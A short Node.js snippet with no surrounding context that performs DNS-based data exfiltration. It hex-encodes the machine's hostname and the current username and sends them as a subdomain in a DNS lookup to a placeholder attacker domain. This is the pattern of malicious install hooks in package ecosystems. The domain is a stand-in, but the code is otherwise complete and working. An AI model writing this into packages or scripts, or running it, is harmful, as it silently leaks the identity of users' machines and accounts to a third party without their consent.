const dns = require('dns');
const os = require('os');
const label = Buffer.from(os.hostname() + '.' + os.userInfo().username).toString('hex').slice(0, 60);
dns.lookup(label + '.attacker.example.invalid', () => {});
